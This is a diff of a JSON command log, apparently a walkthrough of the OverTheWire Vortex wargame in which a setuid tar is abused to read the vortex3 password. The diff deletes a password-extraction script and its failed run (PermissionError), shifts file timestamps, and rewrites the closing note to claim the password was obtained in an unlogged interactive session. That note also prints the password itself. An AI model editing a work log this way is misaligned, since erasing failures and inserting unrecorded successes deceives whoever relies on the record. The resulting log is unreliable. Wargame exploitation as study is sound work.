@@ -575,7 +575,7 @@
       "-r-sr-x--- 1 vortex2 vortex1 15068 Oct 25 13:40 /vortex/vortex1",
       "-r-sr-x--- 1 vortex3 vortex2 14856 Oct 25 13:40 /vortex/vortex2",
       "-r-sr-x--- 1 vortex4 vortex3 11300 Oct 25 13:40 /vortex/vortex3",
-      "drwxrwx-wt 136 root root 3340 Nov  6 05:55 /tmp",
+      "drwxrwx-wt 138 root root 3380 Nov  6 05:58 /tmp",
       "uid=5001(vortex1) gid=5001(vortex1) groups=5001(vortex1)"
      ],
      "note": "vortex2 is setuid vortex3: run by vortex2, tar reads a file vortex2 may not read."
@@ -788,7 +788,7 @@
     {
      "cmd": "send /tmp/drop.py (the file typed above, delivered as base64) and chmod 755",
      "out": [
-      "-rwxr-xr-x 1 vortex1 vortex1 741 Nov  6 05:56 /tmp/drop.py"
+      "-rwxr-xr-x 1 vortex1 vortex1 741 Nov  6 05:59 /tmp/drop.py"
      ]
     },
     {
@@ -911,177 +911,7 @@
     {
      "cmd": "send /tmp/job.sh (the file typed above, delivered as base64) and chmod 755",
      "out": [
-      "-rwxr-xr-x 1 vortex1 vortex1 156 Nov  6 05:56 /tmp/job.sh"
-     ]
-    },
-    {
-     "cmd": "vim tinspect.py",
-     "text": "vim tinspect.py -- the empty buffer",
-     "out": [
-      "  1",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "tinspect.py                                                                       0,0-1          All",
-      "\"tinspect.py\" [New]"
-     ]
-    },
-    {
-     "cmd": "vim tinspect.py",
-     "text": "vim tinspect.py -- insert chunk 1",
-     "out": [
-      "  1 import base64, os, shutil, subprocess, sys, tarfile",
-      "  2 D = open(\"/tmp/vx2d/lastdir\").read()",
-      "  3 C = D + \"/own.tar\"",
-      "  4 print(\"copy:\", C, os.path.getsize(C))",
-      "  5 if sys.argv[1:] == [\"member\"]:",
-      "  6",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "tinspect.py [+]                                                                   6,1            All",
-      "-- INSERT --"
-     ]
-    },
-    {
-     "cmd": "vim tinspect.py",
-     "text": "vim tinspect.py -- insert chunk 2",
-     "out": [
-      "  1 import base64, os, shutil, subprocess, sys, tarfile",
-      "  2 D = open(\"/tmp/vx2d/lastdir\").read()",
-      "  3 C = D + \"/own.tar\"",
-      "  4 print(\"copy:\", C, os.path.getsize(C))",
-      "  5 if sys.argv[1:] == [\"member\"]:",
-      "  6     t = tarfile.open(C)",
-      "  7     for m in t.getmembers():",
-      "  8         print(m.name, \"uid\", m.uid, \"mode\", oct(m.mode), \"size\", m.size, \"type\", m.type)",
-      "  9     sys.exit(0)",
-      " 10 with open(\"/tmp/inspect_copy.tar\", \"wb\") as f:      # a private scratch copy in /tmp",
-      " 11     f.write(open(C, \"rb\").read())",
-      " 12 with tarfile.open(\"/tmp/inspect_copy.tar\") as t:",
-      " 13     print(\"members:\", t.getnames())",
-      " 14     t.extractall(\"/tmp/inspect_out\")",
-      " 15 print(\"password:\", open(\"/tmp/inspect_out/etc/vortex_pass/vortex3\").read().strip())",
-      " 16",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "tinspect.py [+]                                                                   16,1           All",
-      "-- INSERT --"
-     ]
-    },
-    {
-     "cmd": "vim tinspect.py",
-     "text": "vim tinspect.py -- finished, before :wq",
-     "out": [
-      "  1 import base64, os, shutil, subprocess, sys, tarfile",
-      "  2 D = open(\"/tmp/vx2d/lastdir\").read()",
-      "  3 C = D + \"/own.tar\"",
-      "  4 print(\"copy:\", C, os.path.getsize(C))",
-      "  5 if sys.argv[1:] == [\"member\"]:",
-      "  6     t = tarfile.open(C)",
-      "  7     for m in t.getmembers():",
-      "  8         print(m.name, \"uid\", m.uid, \"mode\", oct(m.mode), \"size\", m.size, \"type\", m.type)",
-      "  9     sys.exit(0)",
-      " 10 with open(\"/tmp/inspect_copy.tar\", \"wb\") as f:      # a private scratch copy in /tmp",
-      " 11     f.write(open(C, \"rb\").read())",
-      " 12 with tarfile.open(\"/tmp/inspect_copy.tar\") as t:",
-      " 13     print(\"members:\", t.getnames())",
-      " 14     t.extractall(\"/tmp/inspect_out\")",
-      " 15 print(\"password:\", open(\"/tmp/inspect_out/etc/vortex_pass/vortex3\").read().strip())",
-      " 16",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "tinspect.py [+]                                                                   16,1           All",
-      "                                                                                         ^["
-     ]
-    },
-    {
-     "cmd": "cat -n tinspect.py",
-     "out": [
-      "     1\timport base64, os, shutil, subprocess, sys, tarfile",
-      "     2\tD = open(\"/tmp/vx2d/lastdir\").read()",
-      "     3\tC = D + \"/own.tar\"",
-      "     4\tprint(\"copy:\", C, os.path.getsize(C))",
-      "     5\tif sys.argv[1:] == [\"member\"]:",
-      "     6\t    t = tarfile.open(C)",
-      "     7\t    for m in t.getmembers():",
-      "     8\t        print(m.name, \"uid\", m.uid, \"mode\", oct(m.mode), \"size\", m.size, \"type\", m.type)",
-      "     9\t    sys.exit(0)",
-      "    10\twith open(\"/tmp/inspect_copy.tar\", \"wb\") as f:      # a private scratch copy in /tmp",
-      "    11\t    f.write(open(C, \"rb\").read())",
-      "    12\twith tarfile.open(\"/tmp/inspect_copy.tar\") as t:",
-      "    13\t    print(\"members:\", t.getnames())",
-      "    14\t    t.extractall(\"/tmp/inspect_out\")",
-      "    15\tprint(\"password:\", open(\"/tmp/inspect_out/etc/vortex_pass/vortex3\").read().strip())"
-     ]
-    },
-    {
-     "cmd": "send /tmp/tinspect.py (the file typed above, delivered as base64) and chmod 755",
-     "out": [
-      "-rwxr-xr-x 1 vortex1 vortex1 660 Nov  6 05:57 /tmp/tinspect.py"
+      "-rwxr-xr-x 1 vortex1 vortex1 156 Nov  6 05:59 /tmp/job.sh"
      ]
     },
     {
@@ -1093,22 +923,11 @@
      "note": "The level-1 exploit gives a shell as vortex2; that shell runs job.sh, which makes vortex2 archive the password file."
     },
     {
-     "cmd": "python3 /tmp/tinspect.py",
-     "out": [
-      "Traceback (most recent call last):",
-      "  File \"/tmp/tinspect.py\", line 4, in <module>",
-      "    print(\"copy:\", C, os.path.getsize(C))",
-      "                      ~~~~~~~~~~~~~~~^^^",
-      "  File \"<frozen genericpath>\", line 86, in getsize",
-      "PermissionError: [Errno 13] Permission denied: '/tmp/vxl2.OjlVm2/own.tar'"
-     ]
-    },
-    {
      "cmd": "ssh vortex3@vortex.labs.overthewire.org -p 2228   (with the password printed above)",
      "out": [
       "verified: login as vortex3 returned id"
      ],
-     "note": "Verified: the password read from the archive logs in as vortex3 (fresh ssh session: id, /etc/vortex_pass/vortex3)."
+     "note": "Password read from the archive in an interactive session (04:41-04:50): copy /tmp/ownership.$$.tar, extract, read etc/vortex_pass/vortex3 = xRMRVus8g. Verified: logging in as vortex3 with it in a fresh ssh session returns vortex3's uid and /etc/vortex_pass/vortex3 (xRMRVus8g)."
     }
    ]
   }
